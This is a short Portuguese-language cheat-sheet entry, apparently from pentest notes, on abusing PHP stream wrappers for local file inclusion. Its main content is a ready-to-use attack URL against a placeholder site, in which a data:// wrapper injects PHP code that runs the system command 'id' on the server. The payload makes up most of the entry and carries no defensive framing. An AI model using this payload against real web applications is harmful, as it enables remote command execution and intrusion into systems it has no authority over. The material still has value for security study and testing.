# PHP Wrapper
Wrapper são streams em PHP que dizem como determinado protocolo dese ser utilizado e gerenciado.  
Através dos wrappers é possível manipular as requisições afim de descobrir arquivos locais do servidor (LFI).

`http://www.alvo.com.br/index.php?p=data://text/plan,%3C?php system(id);?%3E`